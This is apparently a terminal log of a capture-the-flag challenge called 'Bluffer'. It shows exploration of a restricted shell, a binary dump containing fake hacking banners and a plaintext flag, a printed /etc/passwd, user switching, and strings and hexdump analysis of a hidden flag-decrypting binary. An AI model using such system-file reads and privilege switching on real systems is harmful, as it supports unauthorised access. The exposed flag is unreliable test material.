-rwxr-xr-x 1 root    root       53 Apr  9 15:23 START_BLUFFER
lrwxrwxrwx 1 root    root        9 Apr  8 13:08 bash -> /bin/bash
-rwxr-xr-x 1 root    root    18999 Apr  9 15:10 bluffer
-rwxr-xr-x 1 root    root       31 Apr  8 11:34 cat
-rwxr-xr-x 1 root    root       31 Apr  8 11:40 cd
-rwxr-xr-x 1 root    root       31 Apr  8 11:39 chmod
-rwxr-xr-x 1 root    root       31 Apr  8 11:39 chown
-rwxr-xr-x 1 root    root       16 Apr  8 11:57 clear
-rwxr-xr-x 1 root    root       31 Apr  8 11:40 cp
-rwxr-xr-x 1 root    root       31 Apr  8 11:34 echo
-rwxr-xr-x 1 root    root       31 Apr  8 12:11 exit
-rwxr-xr-x 1 root    root       31 Apr  8 11:34 grep
-rwxr-xr-x 1 root    root       31 Apr  8 11:38 la
-rwxr-xr-x 1 root    root       31 Apr  8 11:34 ls
-rwxr-xr-x 1 root    root       31 Apr  8 12:00 man
-rwxr-xr-x 1 root    root       31 Apr  8 11:34 more
-rwxr-xr-x 1 root    root       31 Apr  8 11:40 mv
-rwxr-xr-x 1 root    root       31 Apr  8 11:34 pwd
-rwxr-xr-x 1 root    root       31 Apr  8 11:40 rm
-rwxr-xr-x 1 root    root       31 Apr  8 13:20 sudo
-rwxr-xr-x 1 root    root       31 Apr  8 11:41 tee
-rwxr-xr-x 1 root    root       31 Apr  8 11:39 top
-rwxr-xr-x 1 root    root       31 Apr  8 11:40 touch
-rwxr-xr-x 1 root    root       31 Apr  8 13:33 uname
-rwxr-xr-x 1 root    root       31 Apr  8 11:36 whoami

/usr/local/bin/OPEN_SMB
chmod +x /usr/local/bin/OPEN_SMB
/usr/local/bin/OPEN_SMB

ls -la /usr/local/samba/etc/
total 12
drwxr-xr-x  2 root root 4096 Oct 25 18:43 .
drwxr-xr-x 10 root root 4096 Oct 25 18:31 ..
-rw-r--r--  1 root root  387 Apr  9 10:33 smb.conf

/usr/local/bin/OPEN_SMB > smb_output.log 2>&1
cat smb_output.log
/usr/local/bin/OPEN_SMB > smb_output.log 2>&1
cat smb_output.log

cat /home/bluffer/cmds/bluffer | head -n 20
@@ 2@8  @@@@@ 88@8@@@ ( (  - -` -`  ..` TT@T@DDP td % %@ %@  Q tdR td - -` -`/lib64/ld-linux-x86-64.so.2GNU▒GNU T gt1Lnfz    q ]      P      #'( BE     |fUa +  qX      ! 
                                              zmV /  s=-  6   ]EC    W  qg O 1 ▒ 1`  4`) 1< 1  1` 
                                     
                                     @  @libncurses.so.5_ITM_deregisterTMCloneTable__gmon_start__stdscr_Jv_RegisterClasses_ITM_registerTMCloneTablecurs_setwaddchnoechomvprintwwgetch_finiendwin_initwrefreshwclearwmoveinitscrlibtinfo.so.5keypadlibc.so.6fflushexit__isoc99_scanfstrncpyputs__stack_chk_failputcharstdinprintfungetcgetchartcsetattrstdoutsystemtcgetattrsleepfcntl__libc_start_main_edata__bss_start_endGLIBC_2.7GLIBC_2.4GLIBC u▒i.5 i  /` 1`  1`# 1`$▒0` 0`(0`00`80`@0`H0P0` X0`
`0`
   h0`
x0` 0` 0` 0` 0` 0` 0` 0` 0` 0`▒ 0` 0`▒ 0` 0` 0` 0`H H  # H  t  H   5 #  % # @ % # h      % # h      % # h      % # h      % # h      % # h      % # h      % # h p    % #  `    % # h     P    % # h
 @    % # h
            0    % # h
     % # h     %z# h      %r# h      %j# h      %b# h      %Z# h      %R# h      %J# h      %B# h      %:# h p    %2# h▒ `    %*# h P    %"# h▒ @    %▒# h0   1 I  ^H  H   PTI   @H  0@H  c▒@      fD  1`UH- 1`H  H  w]øH  t ]  1`     1`UH- 1`H  H  H  H  ?H H  u]úH  t ]H ƿ 1`    =1# uUH   ~   ] #   @H =X t H  tU .`H    ] {    s   UH  H  PdH %(H E 1 H E H ƿ [    E     E  E     E H E H ¾  C   H E dH3%(t ?     UH  H  PdH %(H E 1 H E H ƿ      E    E  E   E H E H ¾      H E dH3%(t       UH  H   dH %(H E 1 H  p   H ƿ     H  p   H E H  x   H E H E H E H E H E H E H E H E H E H E H E  E  E  E     E H E H ¾  6             h     h     ¾        s     l   H  p   H ¾        h    ¾         l    tH      l   H ։  H      H M dH3
                                   %(t       UH  H   H  `     "@ H  H   H HǅP   ▒@HǅX   :@ S@ Q         ǅH    3  H   H H   `   H ƿY@  9     O     H     H   ~Ŀ 5    S@     ǅL    3  L   H H   P   H ƿY@              L     L   ~Ŀ      S@             UH  H   S@ q        H   H        E  ' #     H ^ H         l    E  } ~ӿ
       N    S@      #@       0    6#@      E  ' . s   H   H   D          E  } ~ӿ
 F    N#@ \          S@      E  ' .    H   H              E  } ~ӿ
      
             UH  H ĀdH %(H E 1  S@     `#@       #@       #@       #@       #@      $@      0$@      `$@           E  a . D   H   H                    t,      E  }  u  $@ %           a    E  } ~  
      S@ 3     $@  D   H E H ƿ $@      
       $@     H E H ƿ $@            H E dH3%(t       UH  H   E    E H H 
            1` E Hc H  H H H  H H H`3` ▒H  H       E  m E HcȋE Hc H  H H H  H H H H2`   E HcȋE Hc H  H H H  H H H H`3` <*u B    9  E  } ▒~  E  } 
                      :     UH   E  E    E    E HcȋE Hc H  H H H  H H H H`3` <EuU E H  U    1` E H  U    1` E HcȋE Hc H  H H H  H H H H`3` E E  } ~  E  } ▒ n    E  } 
                                           T   ] UH   E    E     U )Ѓ      ▒  U )Ѓ y  ▒  U )Ѓ  |g  ▒  U )Ѓ U E HcȋE Hc H  H H H  H H H H`3` E Hc  E Hc H  H H H  H H H H2` E  } ▒ Q    E  } 
   7   ] UH  H   E  t E  aH R▒  U  M   H   2      tA E HcȋE Hc H  H H H  H H H H2` H  H ▒ H  H        E  } ▒~  E  } 
 } Et   ] UH  H    E      E H    1`)ЉE   H H H`3`  E  } #t
  E H    1`)ЉE  }  } y      
                                E  }  } y      
                                                   E  E H    1` E  E H    1` E  } tb E  U E  ։        tJ E HcȋE Hc H  H H H  H H H H`3`   E H    1` E E H    1` f } t` E  U E  Ɖ        tH E HcȋE Hc H  H H H  H H H H`3`   E H    1` E E H    1` E H    1` E H    1`Hc Hc H  H H H  H H H H`3` E E  }  S     UH   E  7 E H    1` W 9 u E H    1` E 9 u   E  } ~ø] UH  H         F          '   H    H        ▒         H   H               i   H  } u E  U  E  ։           E HcȋE Hc H  H H H  H H H H`3` <*u 3    *       Hc Hc H  H H H  H H H H`3`   E     E          Hc Hc H  H H H  H H H H`3` @  ;              d    [  U   uKH j H       %@    i   H B H   ▒   H 3 H              (%@    %   H   H                   9 uHH   H   ]    `%@            H   H       H   H                    AWA  AVI  AUI  ATL %  UH -  SL) 1 H  H      H  t L  L  D  A  H  H9 u H []A\A]A^A_ ff.   H H  ##########################@       *####         *#### ###### ## ##### ### ##   #    #     E  # #   ## #### ####### #### ###### #    #*      #        ## ######## ##### ###### ##        # #        #*# ######### # ######## # # ##     *#            # # ## ################### # ##                    *  #[*] Payload successfully deployed[*] Encrypted Server ...clear%s
[*] Connecting to server 10.10.6PmP.@*x4[*] Connected ...[*] Authenticating user : fyc5QNQ0twf*mjc2ebr[*] Authentication successful.[*] Accessing server resources : kvd2MAV@vxk4mcg!ecv[*] Downloading sensitive data : pdAFihaBYt6@*x4-T6Qqvq8ph.6PmP[*] GET /admin/config/settings HTTP/1.1[*] Host: 127.0.0.1[*] Hostname: Nebula Server Kernel[*] Authorization: Bearer : <token> CJcKuhwvsYKx3g9-yM.LwGfJEqXT.2u8co_Cid!.bW8ii8np7_KEgDFegEh34F-F42a6QTEmbPyTg </token>[*] Data received from server :---------------------------root::0:0:root:/root:/bin/bashadmin:x:1:1:admin:/admin:/bin/sh[*] Injecting malicious code[*] Sending payload ...[*] POST /admin/upload HTTP/1.1[*] Content-Type: application/x-www-form-urlencoded[*] Payload:h@ @ @ @ @0 @p @  @  @  @X!@x!@ !@ !@x!@ !@ !@"@0"@d"@ RYUK V0.02a2             
                                                              
HANDLER RANSOMWARE FILEEXEC CODING                            
****************************************                                     **         NEBULA.IO PRESENTA          **              BLUFFER                ****************************************                                                     
   Un viaje a través de las mazmorras          Cargando, por favor espera                                                   
                                                              
                                                              
Carga interrumpida. Fallo en el sistemaIntroduce tu nombre: %sIntroduce tu email: Vidas: %d  Coleccionados: %d/%dHas perdido todas tus vidas.Has sido alcanzado por un enemigo. Vidas restantes: %dFLAG {MAZE-COLLECTABLES-COMPLETED}      \    I       
                                                              ,   Lf   ly         =                                         
                                     ,y   L    l                  zRx                                                       
          *zRx                                                
             $     F▒J                                        
a                      ?▒;*3$"D5   fA C                       
a{   fA C                                                     
L    QA C                                                     
     A C                                                      
L    QA C                                                     
n   sA C                                                      
@8#T@T 1t@t$D   o @ N                                         
 %    A C             @ ▒V @  ^   o@Pk   o@z@▒ P        @P    
      A C                                                   ▒       A C                                                     
M@   RA C                                                     
 W ▒  A C                                                     
L    @A C                                                     
   @      @     %@ %   &@ &  -`  -` ...  / 0` 1`1   1` 1▒  0 1+ H: eB E▒ E  E( H0 H8 M@l8A0A(B B▒BL    @ @                  
▒       E'8@T@t@ @ @ @@ @                                     
^C                                             @              
Abort session 2? [y/N]  N                                     
[*] Aborting foreground process in the shell session          
/bin/sh: 42: : not found         @6                           
cat /etc/passwd                    @F                         
root:x:0:0:root:/root:/bin/bash      @V                       
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin               
bin:x:2:2:bin:/bin:/usr/sbin/nologin     @v                   
sys:x:3:3:sys:/dev:/usr/sbin/nologin       @                  
sync:x:4:65534:sync:/bin:/bin/sync           @                
games:x:5:60:games:/usr/games:/usr/sbin/nologin@              
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  @            
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin       @          
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin          @        
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin      @      
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin      @    
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin.4-2ubuntu1~14.04.4)www-data:x:33:33:www-data:/var/www:/usr/sbin/nologinte.gnu.buibackup:x:34:34:backup:/var/backups:/usr/sbin/nologin_r.rela.dylist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinrirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologincomment       
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
guakamole:x:1000:1000:David Kline,,,:/home/guakamole:/bin/bash
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
bind:x:105:112::/var/cache/bind:/bin/false
bluffer:x:1001:1001:Player Bluffer,,,:/home/bluffer:/bin/rbash

cat /etc/os-release
NAME="Ubuntu"
VERSION="14.04.6 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.6 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"

id
uid=0(root) gid=0(root) groups=0(root)

su - guakamole

sudo -u guakamole -i
whoami
guakamole

cat /home/guakamole/.bash_history
ls    
warning.txt
cat warning.txt
Cuidado con "ryuk"
ps aux | grep ryuk
guakamo+  1457  0.0  0.2  11760  2240 ?        S    11:52   0:00 grep ryuk
ls -la /path/to/folder
ls: cannot access /path/to/folder: No such file or directory
sudo find / -user guakamole
sudo: no tty present and no askpass program specified
su find / -user guakamole
su: must be run from a terminal

find / -name "*ryuk*" 2>/dev/null
/home/.ryuk
cd /home/guakamole
ls -la
total 28
drwxr-xr-x 3 guakamole guakamole 4096 Apr  9 15:40 .
drwxr-xr-x 4 root      root      4096 Apr  9 15:55 ..
lrwxrwxrwx 1 guakamole guakamole    9 Nov  3 13:06 .bash_history -> /dev/null
-rw-r--r-- 1 guakamole guakamole  220 Oct 18 17:29 .bash_logout
-rw-r--r-- 1 guakamole guakamole 3738 Apr  9 17:07 .bashrc
drwx------ 2 guakamole guakamole 4096 Oct 18 17:29 .cache
-rw-r--r-- 1 guakamole guakamole  675 Oct 18 17:29 .profile
-rw-r--r-- 1 root      root        19 Apr  9 16:59 warning.txt

ls -la /home/.ryuk
-rwxr-xr-x 1 root root 6352 Nov  3 14:27 /home/.ryuk

find / -name "*ryuk*" 2>/dev/null
/home/.ryuk

ps aux | grep ryuk
guakamo+  1468  0.0  0.2  11760  2256 ?        S    11:57   0:00 grep ryuk

file /home/.ryuk
/home/.ryuk: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=d45415661463169dc7db1ffd631444ca21781a7a, stripped
sha256sum /home/.ryuk
1cf203384200024c3ef8f49b49de8c9659a1c27bf7491fae89f7d03b6cd2c3f7  /home/.ryuk

rm -f /home/.ryuk
rm: cannot remove ‘/home/.ryuk’: Permission denied

ls -l /home/.ryuk
-rwxr-xr-x 1 root root 6352 Nov  3 14:27 /home/.ryuk
chmod 777 /home/.ryuk
chmod: changing permissions of ‘/home/.ryuk’: Operation not permitted
cp /home/.ryuk /home/guakamole/

strings /home/.ryuk
/lib64/ld-linux-x86-64.so.2
libc.so.6
fopen
puts
__stack_chk_fail
putchar
stdin
fgetc
fgets
strcspn
fclose
remove
system
sleep
strcmp
__libc_start_main
snprintf
__gmon_start__
GLIBC_2.4
GLIBC_2.2.5
[]A\A]A^A_
Cual es el nombre del juego: 
Bluffer
Password Invalid.
/tmp/flag_output.txt
/usr/.flag.enc
openssl enc -aes-256-cbc -d -in %s -out %s -pass pass:%s 2>/dev/null
Error
/usr/bin/open_flag
;*3$"
GCC: (Ubuntu 4.8.4-2ubuntu1~14.04.4) 4.8.4
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment

hexdump -C /home/.ryuk
00000000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|
00000010  02 00 3e 00 01 00 00 00  50 08 40 00 00 00 00 00  |..>.....P.@.....|
00000020  40 00 00 00 00 00 00 00  d0 11 00 00 00 00 00 00  |@...............|
00000030  00 00 00 00 40 00 38 00  09 00 40 00 1c 00 1b 00  |....@.8...@.....|
00000040  06 00 00 00 05 00 00 00  40 00 00 00 00 00 00 00  |........@.......|
00000050  40 00 40 00 00 00 00 00  40 00 40 00 00 00 00 00  |@.@.....@.@.....|
00000060  f8 01 00 00 00 00 00 00  f8 01 00 00 00 00 00 00  |................|
00000070  08 00 00 00 00 00 00 00  03 00 00 00 04 00 00 00  |................|
00000080  38 02 00 00 00 00 00 00  38 02 40 00 00 00 00 00  |8.......8.@.....|
00000090  38 02 40 00 00 00 00 00  1c 00 00 00 00 00 00 00  |8.@.............|
000000a0  1c 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|
000000b0  01 00 00 00 05 00 00 00  00 00 00 00 00 00 00 00  |................|
000000c0  00 00 40 00 00 00 00 00  00 00 40 00 00 00 00 00  |..@.......@.....|
000000d0  4c 0d 00 00 00 00 00 00  4c 0d 00 00 00 00 00 00  |L.......L.......|
000000e0  00 00 20 00 00 00 00 00  01 00 00 00 06 00 00 00  |.. .............|
000000f0  10 0e 00 00 00 00 00 00  10 0e 60 00 00 00 00 00  |..........`.....|
00000100  10 0e 60 00 00 00 00 00  98 02 00 00 00 00 00 00  |..`.............|
00000110  a8 02 00 00 00 00 00 00  00 00 20 00 00 00 00 00  |.......... .....|
00000120  02 00 00 00 06 00 00 00  28 0e 00 00 00 00 00 00  |........(.......|
00000130  28 0e 60 00 00 00 00 00  28 0e 60 00 00 00 00 00  |(.`.....(.`.....|
00000140  d0 01 00 00 00 00 00 00  d0 01 00 00 00 00 00 00  |................|
00000150  08 00 00 00 00 00 00 00  04 00 00 00 04 00 00 00  |................|
00000160  54 02 00 00 00 00 00 00  54 02 40 00 00 00 00 00  |T.......T.@.....|
00000170  54 02 40 00 00 00 00 00  44 00 00 00 00 00 00 00  |T.@.....D.......|
00000180  44 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |D...............|
00000190  50 e5 74 64 04 00 00 00  18 0c 00 00 00 00 00 00  |P.td............|
000001a0  18 0c 40 00 00 00 00 00  18 0c 40 00 00 00 00 00  |..@.......@.....|
000001b0  34 00 00 00 00 00 00 00  34 00 00 00 00 00 00 00  |4.......4.......|
000001c0  04 00 00 00 00 00 00 00  51 e5 74 64 06 00 00 00  |........Q.td....|
000001d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000001f0  00 00 00 00 00 00 00 00  10 00 00 00 00 00 00 00  |................|
00000200  52 e5 74 64 04 00 00 00  10 0e 00 00 00 00 00 00  |R.td............|
00000210  10 0e 60 00 00 00 00 00  10 0e 60 00 00 00 00 00  |..`.......`.....|
00000220  f0 01 00 00 00 00 00 00  f0 01 00 00 00 00 00 00  |................|
00000230  01 00 00 00 00 00 00 00  2f 6c 69 62 36 34 2f 6c  |......../lib64/l|
00000240  64 2d 6c 69 6e 75 78 2d  78 38 36 2d 36 34 2e 73  |d-linux-x86-64.s|
00000250  6f 2e 32 00 04 00 00 00  10 00 00 00 01 00 00 00  |o.2.............|
00000260  47 4e 55 00 00 00 00 00  02 00 00 00 06 00 00 00  |GNU.............|
00000270  18 00 00 00 04 00 00 00  14 00 00 00 03 00 00 00  |................|
00000280  47 4e 55 00 d4 54 15 66  14 63 16 9d c7 db 1f fd  |GNU..T.f.c......|
00000290  63 14 44 ca 21 78 1a 7a  02 00 00 00 11 00 00 00  |c.D.!x.z........|
000002a0  01 00 00 00 06 00 00 00  00 00 20 00 80 00 00 00  |.......... .....|
000002b0  00 00 00 00 11 00 00 00  67 55 61 10 00 00 00 00  |........gUa.....|
000002c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000002d0  00 00 00 00 00 00 00 00  27 00 00 00 12 00 00 00  |........'.......|
000002e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000002f0  50 00 00 00 12 00 00 00  00 00 00 00 00 00 00 00  |P...............|
00000300  00 00 00 00 00 00 00 00  11 00 00 00 12 00 00 00  |................|
00000310  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000320  49 00 00 00 12 00 00 00  00 00 00 00 00 00 00 00  |I...............|
00000330  00 00 00 00 00 00 00 00  16 00 00 00 12 00 00 00  |................|
00000340  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000350  57 00 00 00 12 00 00 00  00 00 00 00 00 00 00 00  |W...............|
00000360  00 00 00 00 00 00 00 00  7f 00 00 00 12 00 00 00  |................|
00000370  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000380  7d 00 00 00 12 00 00 00  00 00 00 00 00 00 00 00  |}...............|
00000390  00 00 00 00 00 00 00 00  35 00 00 00 12 00 00 00  |........5.......|
000003a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000003b0  41 00 00 00 12 00 00 00  00 00 00 00 00 00 00 00  |A...............|
000003c0  00 00 00 00 00 00 00 00  6b 00 00 00 12 00 00 00  |........k.......|
000003d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000003e0  3b 00 00 00 12 00 00 00  00 00 00 00 00 00 00 00  |;...............|
000003f0  00 00 00 00 00 00 00 00  64 00 00 00 12 00 00 00  |........d.......|
00000400  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000410  86 00 00 00 20 00 00 00  00 00 00 00 00 00 00 00  |.... ...........|
00000420  00 00 00 00 00 00 00 00  0b 00 00 00 12 00 00 00  |................|
00000430  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000440  5e 00 00 00 12 00 00 00  00 00 00 00 00 00 00 00  |^...............|
00000450  00 00 00 00 00 00 00 00  2f 00 00 00 11 00 19 00  |......../.......|
00000460  a8 10 60 00 00 00 00 00  08 00 00 00 00 00 00 00  |..`.............|
00000470  00 6c 69 62 63 2e 73 6f  2e 36 00 66 6f 70 65 6e  |.libc.so.6.fopen|
00000480  00 70 75 74 73 00 5f 5f  73 74 61 63 6b 5f 63 68  |.puts.__stack_ch|
00000490  6b 5f 66 61 69 6c 00 70  75 74 63 68 61 72 00 73  |k_fail.putchar.s|
000004a0  74 64 69 6e 00 66 67 65  74 63 00 66 67 65 74 73  |tdin.fgetc.fgets|
000004b0  00 73 74 72 63 73 70 6e  00 66 63 6c 6f 73 65 00  |.strcspn.fclose.|
000004c0  72 65 6d 6f 76 65 00 73  79 73 74 65 6d 00 73 6c  |remove.system.sl|
000004d0  65 65 70 00 73 74 72 63  6d 70 00 5f 5f 6c 69 62  |eep.strcmp.__lib|
000004e0  63 5f 73 74 61 72 74 5f  6d 61 69 6e 00 73 6e 70  |c_start_main.snp|
000004f0  72 69 6e 74 66 00 5f 5f  67 6d 6f 6e 5f 73 74 61  |rintf.__gmon_sta|
00000500  72 74 5f 5f 00 47 4c 49  42 43 5f 32 2e 34 00 47  |rt__.GLIBC_2.4.G|
00000510  4c 49 42 43 5f 32 2e 32  2e 35 00 00 00 00 02 00  |LIBC_2.2.5......|
00000520  02 00 02 00 02 00 03 00  02 00 02 00 02 00 02 00  |................|
00000530  02 00 02 00 02 00 02 00  00 00 02 00 02 00 02 00  |................|
00000540  01 00 02 00 01 00 00 00  10 00 00 00 00 00 00 00  |................|
00000550  14 69 69 0d 00 00 03 00  95 00 00 00 10 00 00 00  |.ii.............|
00000560  75 1a 69 09 00 00 02 00  9f 00 00 00 00 00 00 00  |u.i.............|
00000570  f8 0f 60 00 00 00 00 00  06 00 00 00 0e 00 00 00  |..`.............|
00000580  00 00 00 00 00 00 00 00  a8 10 60 00 00 00 00 00  |..........`.....|
00000590  05 00 00 00 11 00 00 00  00 00 00 00 00 00 00 00  |................|
000005a0  18 10 60 00 00 00 00 00  07 00 00 00 01 00 00 00  |..`.............|
000005b0  00 00 00 00 00 00 00 00  20 10 60 00 00 00 00 00  |........ .`.....|
000005c0  07 00 00 00 02 00 00 00  00 00 00 00 00 00 00 00  |................|
000005d0  28 10 60 00 00 00 00 00  07 00 00 00 03 00 00 00  |(.`.............|
000005e0  00 00 00 00 00 00 00 00  30 10 60 00 00 00 00 00  |........0.`.....|
000005f0  07 00 00 00 04 00 00 00  00 00 00 00 00 00 00 00  |................|
00000600  38 10 60 00 00 00 00 00  07 00 00 00 05 00 00 00  |8.`.............|
00000610  00 00 00 00 00 00 00 00  40 10 60 00 00 00 00 00  |........@.`.....|
00000620  07 00 00 00 06 00 00 00  00 00 00 00 00 00 00 00  |................|
00000630  48 10 60 00 00 00 00 00  07 00 00 00 07 00 00 00  |H.`.............|
00000640  00 00 00 00 00 00 00 00  50 10 60 00 00 00 00 00  |........P.`.....|
00000650  07 00 00 00 08 00 00 00  00 00 00 00 00 00 00 00  |................|
00000660  58 10 60 00 00 00 00 00  07 00 00 00 09 00 00 00  |X.`.............|
00000670  00 00 00 00 00 00 00 00  60 10 60 00 00 00 00 00  |........`.`.....|
00000680  07 00 00 00 0a 00 00 00  00 00 00 00 00 00 00 00  |................|
00000690  68 10 60 00 00 00 00 00  07 00 00 00 0b 00 00 00  |h.`.............|
000006a0  00 00 00 00 00 00 00 00  70 10 60 00 00 00 00 00  |........p.`.....|
000006b0  07 00 00 00 0c 00 00 00  00 00 00 00 00 00 00 00  |................|
000006c0  78 10 60 00 00 00 00 00  07 00 00 00 0d 00 00 00  |x.`.............|
000006d0  00 00 00 00 00 00 00 00  80 10 60 00 00 00 00 00  |..........`.....|
000006e0  07 00 00 00 0e 00 00 00  00 00 00 00 00 00 00 00  |................|
000006f0  88 10 60 00 00 00 00 00  07 00 00 00 0f 00 00 00  |..`.............|
00000700  00 00 00 00 00 00 00 00  90 10 60 00 00 00 00 00  |..........`.....|
00000710  07 00 00 00 10 00 00 00  00 00 00 00 00 00 00 00  |................|
00000720  48 83 ec 08 48 8b 05 cd  08 20 00 48 85 c0 74 05  |H...H.... .H..t.|
00000730  e8 eb 00 00 00 48 83 c4  08 c3 00 00 00 00 00 00  |.....H..........|
00000740  ff 35 c2 08 20 00 ff 25  c4 08 20 00 0f 1f 40 00  |.5.. ..%.. ...@.|
00000750  ff 25 c2 08 20 00 68 00  00 00 00 e9 e0 ff ff ff  |.%.. .h.........|
00000760  ff 25 ba 08 20 00 68 01  00 00 00 e9 d0 ff ff ff  |.%.. .h.........|
00000770  ff 25 b2 08 20 00 68 02  00 00 00 e9 c0 ff ff ff  |.%.. .h.........|
00000780  ff 25 aa 08 20 00 68 03  00 00 00 e9 b0 ff ff ff  |.%.. .h.........|
00000790  ff 25 a2 08 20 00 68 04  00 00 00 e9 a0 ff ff ff  |.%.. .h.........|
000007a0  ff 25 9a 08 20 00 68 05  00 00 00 e9 90 ff ff ff  |.%.. .h.........|
000007b0  ff 25 92 08 20 00 68 06  00 00 00 e9 80 ff ff ff  |.%.. .h.........|
000007c0  ff 25 8a 08 20 00 68 07  00 00 00 e9 70 ff ff ff  |.%.. .h.....p...|
000007d0  ff 25 82 08 20 00 68 08  00 00 00 e9 60 ff ff ff  |.%.. .h.....`...|
000007e0  ff 25 7a 08 20 00 68 09  00 00 00 e9 50 ff ff ff  |.%z. .h.....P...|
000007f0  ff 25 72 08 20 00 68 0a  00 00 00 e9 40 ff ff ff  |.%r. .h.....@...|
00000800  ff 25 6a 08 20 00 68 0b  00 00 00 e9 30 ff ff ff  |.%j. .h.....0...|
00000810  ff 25 62 08 20 00 68 0c  00 00 00 e9 20 ff ff ff  |.%b. .h..... ...|
00000820  ff 25 5a 08 20 00 68 0d  00 00 00 e9 10 ff ff ff  |.%Z. .h.........|
00000830  ff 25 52 08 20 00 68 0e  00 00 00 e9 00 ff ff ff  |.%R. .h.........|
00000840  ff 25 4a 08 20 00 68 0f  00 00 00 e9 f0 fe ff ff  |.%J. .h.........|
00000850  31 ed 49 89 d1 5e 48 89  e2 48 83 e4 f0 50 54 49  |1.I..^H..H...PTI|
00000860  c7 c0 40 0b 40 00 48 c7  c1 d0 0a 40 00 48 c7 c7  |..@.@.H....@.H..|
00000870  3d 09 40 00 e8 77 ff ff  ff f4 66 0f 1f 44 00 00  |=.@..w....f..D..|
00000880  b8 af 10 60 00 55 48 2d  a8 10 60 00 48 83 f8 0e  |...`.UH-..`.H...|
00000890  48 89 e5 77 02 5d c3 b8  00 00 00 00 48 85 c0 74  |H..w.]......H..t|
000008a0  f4 5d bf a8 10 60 00 ff  e0 0f 1f 80 00 00 00 00  |.]...`..........|
000008b0  b8 a8 10 60 00 55 48 2d  a8 10 60 00 48 c1 f8 03  |...`.UH-..`.H...|
000008c0  48 89 e5 48 89 c2 48 c1  ea 3f 48 01 d0 48 d1 f8  |H..H..H..?H..H..|
000008d0  75 02 5d c3 ba 00 00 00  00 48 85 d2 74 f4 5d 48  |u.]......H..t.]H|
000008e0  89 c6 bf a8 10 60 00 ff  e2 0f 1f 80 00 00 00 00  |.....`..........|
000008f0  80 3d b9 07 20 00 00 75  11 55 48 89 e5 e8 7e ff  |.=.. ..u.UH...~.|
00000900  ff ff 5d c6 05 a6 07 20  00 01 f3 c3 0f 1f 40 00  |..].... ......@.|
00000910  48 83 3d 08 05 20 00 00  74 1e b8 00 00 00 00 48  |H.=.. ..t......H|
00000920  85 c0 74 14 55 bf 20 0e  60 00 48 89 e5 ff d0 5d  |..t.U. .`.H....]|
00000930  e9 7b ff ff ff 0f 1f 00  e9 73 ff ff ff 55 48 89  |.{.......s...UH.|
00000940  e5 53 48 81 ec 68 01 00  00 64 48 8b 04 25 28 00  |.SH..h...dH..%(.|
00000950  00 00 48 89 45 e8 31 c0  bf 58 0b 40 00 b8 00 00  |..H.E.1..X.@....|
00000960  00 00 e8 49 fe ff ff 48  8b 15 3a 07 20 00 48 8d  |...I...H..:. .H.|
00000970  85 a0 fe ff ff be 40 00  00 00 48 89 c7 e8 7e fe  |......@...H...~.|
00000980  ff ff 48 8d 85 a0 fe ff  ff be 76 0b 40 00 48 89  |..H.......v.@.H.|
00000990  c7 e8 4a fe ff ff c6 84  05 a0 fe ff ff 00 48 8d  |..J...........H.|
000009a0  85 a0 fe ff ff be 78 0b  40 00 48 89 c7 e8 5e fe  |......x.@.H...^.|
000009b0  ff ff 85 c0 74 14 bf 80  0b 40 00 e8 b0 fd ff ff  |....t....@......|
000009c0  b8 01 00 00 00 e9 d9 00  00 00 48 8d 85 e0 fe ff  |..........H.....|
000009d0  ff 41 b9 78 0b 40 00 41  b8 92 0b 40 00 b9 a7 0b  |.A.x.@.A...@....|
000009e0  40 00 ba b8 0b 40 00 be  00 01 00 00 48 89 c7 b8  |@....@......H...|
000009f0  00 00 00 00 e8 c7 fd ff  ff 48 8d 85 e0 fe ff ff  |.........H......|
00000a00  48 89 c7 e8 98 fd ff ff  be fd 0b 40 00 bf 92 0b  |H..........@....|
00000a10  40 00 e8 19 fe ff ff 48  89 85 98 fe ff ff 48 83  |@......H......H.|
00000a20  bd 98 fe ff ff 00 75 11  bf ff 0b 40 00 e8 3e fd  |......u....@..>.|
00000a30  ff ff b8 01 00 00 00 eb  6a eb 0e 0f be 85 97 fe  |........j.......|
